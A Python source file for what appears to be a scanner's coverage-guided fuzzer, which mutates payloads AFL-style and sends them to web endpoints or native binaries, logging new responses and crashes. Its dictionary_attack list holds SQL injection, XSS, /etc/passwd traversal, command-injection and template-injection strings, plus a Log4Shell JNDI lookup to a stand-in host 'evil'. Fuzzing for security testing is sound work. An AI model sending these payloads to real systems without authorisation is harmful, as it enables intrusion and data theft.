import asyncio
import hashlib
import heapq
import logging
import secrets
from typing import Any
from urllib.parse import urlparse

import httpx

from src.fuzzing.fork_server import ForkServer

logger = logging.getLogger(__name__)

# When set to True, the coverage-guided fuzzer uses the ForkServer
# for native binary fuzzing instead of HTTP-based fuzzing.
_USE_FORK_SERVER: bool = False


class CorpusEntry:
    def __init__(self, payload: str, signature: str, energy: int = 10) -> None:
        self.payload: str = payload
        self.signature: str = signature
        self.energy: int = energy
        try:
            self.birth_time: float = asyncio.get_running_loop().time()
        except RuntimeError:
            self.birth_time = 0.0
        self.hits: int = 0


class CorpusManager:
    def __init__(self, max_size: int = 500) -> None:
        self.entries: list[tuple[int, float, int, CorpusEntry]] = []
        self.max_size: int = max_size
        self.seen_signatures: set[str] = set()
        self._counter: int = 0

    def add(self, payload: str, signature: str) -> None:
        if signature in self.seen_signatures:
            return
        entry = CorpusEntry(payload=payload, signature=signature, energy=10)
        self.seen_signatures.add(signature)
        self._counter += 1
        heapq.heappush(self.entries, (-entry.energy, entry.birth_time, self._counter, entry))
        while len(self.entries) > self.max_size:
            _, _, _, removed = heapq.heappop(self.entries)
            self.seen_signatures.discard(removed.signature)

    def select_next(self) -> CorpusEntry | None:
        if not self.entries:
            return None
        neg_energy, birth_time, _seq, entry = heapq.heappop(self.entries)
        entry.energy -= 1
        if entry.energy > 0:
            heapq.heappush(self.entries, (-entry.energy, birth_time, _seq, entry))
        return entry

    def minimize(self, entry: CorpusEntry) -> CorpusEntry:
        current = entry.payload
        min_payload = current
        for i in range(len(current) - 1, -1, -1):
            candidate = current[:i] + current[i + 1 :]
            if len(candidate) < len(min_payload):
                min_payload = candidate
        return CorpusEntry(payload=min_payload, signature=entry.signature, energy=entry.energy)


class CoverageTracker:
    def __init__(self, max_entries: int = 500) -> None:
        self._coverage_map: dict[str, set[str]] = {}
        self._edge_counter: int = 0
        self._branch_map: dict[str, str] = {}

    def record_edge(self, endpoint: str, status_code: int, response_len: int, content_hash: str) -> str:
        len_band = response_len // 100
        hash_prefix = content_hash[:8]
        signature = f"edge:{status_code}:{len_band}:{hash_prefix}"
        self._coverage_map.setdefault(endpoint, set())
        seen = self._coverage_map[endpoint]
        if signature in seen:
            return ""
        seen.add(signature)
        self._edge_counter += 1
        return signature

    def record_branch(self, endpoint: str, path: str) -> str:
        key = (endpoint, path)
        if key in self._branch_map:
            return self._branch_map[key]
        branch_id = f"branch:{endpoint}:{hash(path)}"
        self._branch_map[key] = branch_id
        return branch_id

    def is_covered(self, endpoint: str, signature: str) -> bool:
        return signature in self._coverage_map.get(endpoint, set())


def bit_flip(data: str) -> str:
    """Flip a random bit in the payload (AFL-style havoc stage)."""
    if not data:
        return "A"
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if len(byte_arr) > 0:
        idx = secrets.randbelow(len(byte_arr))
        bit = secrets.randbelow(8)
        byte_arr[idx] ^= 1 << bit
    return byte_arr.decode("utf-8", errors="ignore")


def byte_flip(data: str, count: int = 1) -> str:
    """Flip *count* random bytes (AFL havoc byte-flip)."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    for _ in range(min(count, len(byte_arr))):
        idx = secrets.randbelow(len(byte_arr))
        byte_arr[idx] ^= 0xFF
    return byte_arr.decode("utf-8", errors="ignore")


def interesting_values(data: str) -> str:
    """Replace a random 1/2/4-byte region with an 'interesting' integer."""
    INTERESTING_8 = [0, 1, 0x7F, 0x80, 0xFF]
    INTERESTING_16 = [0, 0x80, 0xFF, 0x100, 0x7FFF, 0x8000, 0xFFFF]
    INTERESTING_32 = [0, 0x8000, 0xFFFF, 0x10000, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF]
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if len(byte_arr) < 2:
        return data
    width = secrets.choice([1, 2, 4])
    idx = secrets.randbelow(max(1, len(byte_arr) - width + 1))
    if width == 1:
        val = secrets.choice(INTERESTING_8)
        byte_arr[idx] = val & 0xFF
    elif width == 2 and len(byte_arr) >= 2:
        val = secrets.choice(INTERESTING_16)
        byte_arr[idx:idx + 2] = val.to_bytes(2, "little")
    elif width == 4 and len(byte_arr) >= 4:
        val = secrets.choice(INTERESTING_32)
        byte_arr[idx:idx + 4] = val.to_bytes(4, "little")
    return byte_arr.decode("utf-8", errors="ignore")


def havoc_splice(data: str, dictionary: list[str]) -> str:
    """AFL-style havoc splice: replace a random region with a chunk from a dictionary entry."""
    if not dictionary:
        return data
    donor = secrets.choice(dictionary)
    if not donor:
        return data
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    donor_arr = bytearray(donor.encode("utf-8", errors="ignore"))
    if len(byte_arr) < 2 or not donor_arr:
        return data
    start = secrets.randbelow(len(byte_arr))
    length = secrets.randbelow(min(len(donor_arr), max(1, len(byte_arr) - start)))
    byte_arr[start:start + length] = donor_arr[:length]
    return byte_arr.decode("utf-8", errors="ignore")


def havoc_arithmetic(data: str) -> str:
    """AFL havoc: add/subtract a small value to a random byte."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if not byte_arr:
        return data
    idx = secrets.randbelow(len(byte_arr))
    delta = secrets.choice([-35, -1, 1, 35])
    byte_arr[idx] = (byte_arr[idx] + delta) & 0xFF
    return byte_arr.decode("utf-8", errors="ignore")


def havoc_replace(data: str) -> str:
    """AFL havoc: replace a random byte with a random value."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if not byte_arr:
        return data
    idx = secrets.randbelow(len(byte_arr))
    byte_arr[idx] = secrets.randbelow(256)
    return byte_arr.decode("utf-8", errors="ignore")


def havoc_delete(data: str) -> str:
    """AFL havoc: delete a random chunk."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if len(byte_arr) < 4:
        return data
    start = secrets.randbelow(len(byte_arr))
    length = secrets.randbelow(min(16, len(byte_arr) - start)) + 1
    del byte_arr[start:start + length]
    return byte_arr.decode("utf-8", errors="ignore")


def havoc_clone(data: str) -> str:
    """AFL havoc: clone/insert a random chunk at a random position."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    if len(byte_arr) < 2:
        return data
    start = secrets.randbelow(len(byte_arr))
    length = secrets.randbelow(min(16, len(byte_arr) - start)) + 1
    chunk = byte_arr[start:start + length]
    insert_pos = secrets.randbelow(len(byte_arr) + 1)
    byte_arr[insert_pos:insert_pos] = chunk
    return byte_arr.decode("utf-8", errors="ignore")


def crossover(data: str, other: str) -> str:
    """AFL-style crossover: splice a random region from *other* into *data*."""
    byte_arr = bytearray(data.encode("utf-8", errors="ignore"))
    other_arr = bytearray(other.encode("utf-8", errors="ignore"))
    if not byte_arr or not other_arr:
        return data
    src_start = secrets.randbelow(len(other_arr))
    src_len = secrets.randbelow(min(len(other_arr) - src_start, max(1, len(byte_arr)))) + 1
    dst_start = secrets.randbelow(max(1, len(byte_arr) - src_len + 1))
    byte_arr[dst_start:dst_start + src_len] = other_arr[src_start:src_start + src_len]
    return byte_arr.decode("utf-8", errors="ignore")


def dictionary_attack() -> list[str]:
    """Return a shuffled list of common attack payloads (dictionary stage)."""
    payloads = [
        "' OR '1'='1",
        '" OR "1"="1',
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "../../../../etc/passwd",
        "| id",
        "; id",
        "admin'--",
        "{}",
        "[]",
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>",
        "{{constructor.constructor('return this')()}}",
        "${jndi:ldap://evil/a}",
        "7'+'7",
        "1;DROP TABLE",
        "' OR 1=1#",
        "true OR 1=1",
        "undefined",
        "null",
        "NaN",
        "Infinity",
        "-Infinity",
        "0x7fffffff",
        "-0x80000000",
    ]
    return secrets.SystemRandom().sample(payloads, min(len(payloads), 15))


def generate_havoc_mutations(data: str, dictionary: list[str], count: int = 16) -> list[str]:
    """Generate a batch of AFL-style havoc mutations from *data*.

    Combines bit-flip, byte-flip, interesting values, arithmetic,
    replace, delete, clone, splice-from-dictionary, and crossover
    operations. Returns *count* mutated variants.
    """
    mutants: list[str] = []
    for _ in range(count):
        strategy = secrets.randbelow(9)
        if strategy == 0:
            mutants.append(bit_flip(data))
        elif strategy == 1:
            mutants.append(byte_flip(data, count=secrets.randbelow(4) + 1))
        elif strategy == 2:
            mutants.append(interesting_values(data))
        elif strategy == 3:
            mutants.append(havoc_arithmetic(data))
        elif strategy == 4:
            mutants.append(havoc_replace(data))
        elif strategy == 5:
            mutants.append(havoc_delete(data))
        elif strategy == 6:
            mutants.append(havoc_clone(data))
        elif strategy == 7:
            mutants.append(havoc_splice(data, dictionary))
        else:
            mutants.append(havoc_replace(data))
    return mutants


def boundary_values(param_type: str) -> list[str]:
    if param_type == "numeric":
        return ["0", "-1", "2147483647", "-2147483648", "9223372036854775807", "4294967295"]
    if param_type == "id":
        return ["0", "-1", "999999", "00000000-0000-4000-8000-000000000000"]
    if param_type == "json":
        return ['{"$ne": null}', "[]", "{}", '{"a":' * min(100, max(1, 1000 // 10)) + "1" + "}" * min(100, max(1, 1000 // 10))]
    return ["A" * 10000, "", " ", "null", "undefined"]


async def _execute_coverage_guided_fuzz(
    url: str,
    corpus: CorpusManager,
    tracker: CoverageTracker,
    *,
    client: httpx.AsyncClient | None = None,
    fork_server: ForkServer | None = None,
    timeout_seconds: float = 5.0,
    max_rounds: int = 20,
) -> list[dict[str, Any]]:
    from src.analysis.helpers import endpoint_base_key, endpoint_signature

    if fork_server is not None:
        return await _execute_fork_server_rounds(
            corpus, tracker, fork_server=fork_server, max_rounds=max_rounds
        )

    if client is None:
        raise ValueError("client or fork_server must be provided")

    parsed = urlparse(url)
    base_payload = parsed.query or parsed.path or "/"
    base_signature = f"seed:{hashlib.md5(base_payload.encode("utf-8", errors="ignore")).hexdigest()[:8]}"
    corpus.add(payload=base_payload, signature=base_signature)

    findings: list[dict[str, Any]] = []

    dict_payloads = dictionary_attack()

    for _ in range(max_rounds):
        entry = corpus.select_next()
        if entry is None:
            break

        # Stage 1: Classic mutations (bit-flip + boundary + dictionary)
        mutated_payloads = [bit_flip(entry.payload)]
        for v in boundary_values("default"):
            mutated_payloads.append(v)
        mutated_payloads.extend(dict_payloads[:5])

        # Stage 2: AFL-style havoc mutations (byte-flip, arithmetic,
        # interesting values, splice, clone, delete, replace)
        havoc_count = min(12, max(4, len(corpus.entries)))
        mutated_payloads.extend(
            generate_havoc_mutations(entry.payload, dict_payloads, count=havoc_count)
        )

        # Stage 3: Crossover with a second corpus entry (AFL crossover stage)
        if len(corpus.entries) > 1:
            other_entry = corpus.select_next()
            if other_entry and other_entry.signature != entry.signature:
                mutated_payloads.append(crossover(entry.payload, other_entry.payload))
                mutated_payloads.append(crossover(other_entry.payload, entry.payload))

        endpoint_key = endpoint_signature(url)
        endpoint_base = endpoint_base_key(url)

        for mutated in mutated_payloads:
            try:
                # Cap payload length to avoid exceeding URL size limits (8KB typical)
                capped = mutated[:4096] if len(mutated) > 4096 else mutated
                if "?" in url:
                    mutated_url = url + "&fuzz=" + capped
                else:
                    mutated_url = url + "?fuzz=" + capped
                if len(mutated_url) > 8192:
                    continue
                resp = await client.get(mutated_url, timeout=timeout_seconds)
                status = resp.status_code
                body = resp.text
                resp_len = len(body)
            except Exception as exc:
                logger.debug("URL fuzz request failed for %s: %s", mutated_url, exc)
                continue

            # Use a fixed-size slice to avoid materializing large copies
            content_hash = hashlib.md5(body[:8192].encode("utf-8", errors="replace")).hexdigest()
            edge_signature = tracker.record_edge(url, status, resp_len, content_hash)

            if edge_signature:
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_key,
                        "endpoint_base_key": endpoint_base,
                        "endpoint_type": "http",
                        "issues": ["coverage_new_path_found"],
                        "probe_type": "coverage_guided",
                        "severity": "info",
                        "confidence": 0.7,
                        "evidence": {
                            "edge_signature": edge_signature,
                            "payload": mutated,
                            "status_code": status,
                        },
                    }
                )
                corpus.add(payload=mutated, signature=edge_signature)

            branch_id = tracker.record_branch(url, mutated)
            if branch_id and branch_id not in tracker._branch_map.values():
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_key,
                        "endpoint_base_key": endpoint_base,
                        "endpoint_type": "http",
                        "issues": ["coverage_new_branch_found"],
                        "probe_type": "coverage_guided",
                        "severity": "info",
                        "confidence": 0.7,
                        "evidence": {
                            "branch_id": branch_id,
                            "payload": mutated,
                        },
                    }
                )

            if status >= 500:
                findings.append(
                    {
                        "url": url,
                        "endpoint_key": endpoint_key,
                        "endpoint_base_key": endpoint_base,
                        "endpoint_type": "http",
                        "issues": ["coverage_triggered_crash"],
                        "probe_type": "coverage_guided",
                        "severity": "medium",
                        "confidence": 0.8,
                        "evidence": {
                            "payload": mutated,
                            "status_code": status,
                        },
                    }
                )

    return findings


async def _execute_fork_server_rounds(
    corpus: CorpusManager,
    tracker: CoverageTracker,
    *,
    fork_server: ForkServer,
    max_rounds: int = 20,
) -> list[dict[str, Any]]:
    """Execute coverage-guided fuzzing rounds via ForkServer (native binary).

    Uses the ForkServer to submit payloads to a native target binary
    and records edges based on (exit_code_category, output_length_band,
    output_hash_prefix) instead of HTTP response attributes.
    """
    findings: list[dict[str, Any]] = []
    target_id = f"fork://{'_'.join(fork_server.target_cmd[:2])}"

    for _ in range(max_rounds):
        entry = corpus.select_next()
        if entry is None:
            break

        payload_bytes = entry.payload.encode("utf-8", errors="ignore")
        mutated_payloads = [bit_flip(entry.payload)]
        for v in boundary_values("default"):
            mutated_payloads.append(v)
        mutated_payloads.extend(dictionary_attack())

        for mutated in mutated_payloads:
            try:
                result = await fork_server.run_iteration(mutated.encode("utf-8", errors="ignore"))
            except Exception:
                continue

            exit_cat = result.get("exit_code_category", "unknown")
            output_len = result.get("output_length", 0)
            output_hash = result.get("output_hash", "")

            edge_sig = tracker.record_edge(target_id, hash(exit_cat), output_len, output_hash)
            if edge_sig:
                findings.append({
                    "url": target_id,
                    "endpoint_key": target_id,
                    "endpoint_base_key": target_id,
                    "endpoint_type": "native_binary",
                    "issues": ["fork_new_edge_found"],
                    "probe_type": "coverage_guided_fork",
                    "severity": "info",
                    "confidence": 0.7,
                    "evidence": {
                        "edge_signature": edge_sig,
                        "payload": mutated,
                        "exit_code_category": exit_cat,
                        "output_length": output_len,
                    },
                })
                corpus.add(payload=mutated, signature=edge_sig)

            branch_id = tracker.record_branch(target_id, mutated)
            if branch_id:
                findings.append({
                    "url": target_id,
                    "endpoint_key": target_id,
                    "endpoint_base_key": target_id,
                    "endpoint_type": "native_binary",
                    "issues": ["fork_new_branch_found"],
                    "probe_type": "coverage_guided_fork",
                    "severity": "info",
                    "confidence": 0.7,
                    "evidence": {
                        "branch_id": branch_id,
                        "payload": mutated,
                    },
                })

            if result.get("exit_code", 0) < 0:
                findings.append({
                    "url": target_id,
                    "endpoint_key": target_id,
                    "endpoint_base_key": target_id,
                    "endpoint_type": "native_binary",
                    "issues": ["fork_triggered_crash"],
                    "probe_type": "coverage_guided_fork",
                    "severity": "high",
                    "confidence": 0.9,
                    "evidence": {
                        "exit_code": result["exit_code"],
                        "payload": mutated,
                        "stderr": result.get("stderr", ""),
                    },
                })

    return findings


async def run_coverage_guided_campaign(
    url: str,
    corpus: CorpusManager,
    tracker: CoverageTracker,
    *,
    client: httpx.AsyncClient | None = None,
    fork_server: ForkServer | None = None,
    timeout_seconds: float = 5.0,
    max_rounds: int = 20,
) -> list[dict[str, Any]]:
    return await _execute_coverage_guided_fuzz(
        url,
        corpus,
        tracker,
        client=client,
        fork_server=fork_server,
        timeout_seconds=timeout_seconds,
        max_rounds=max_rounds,
    )
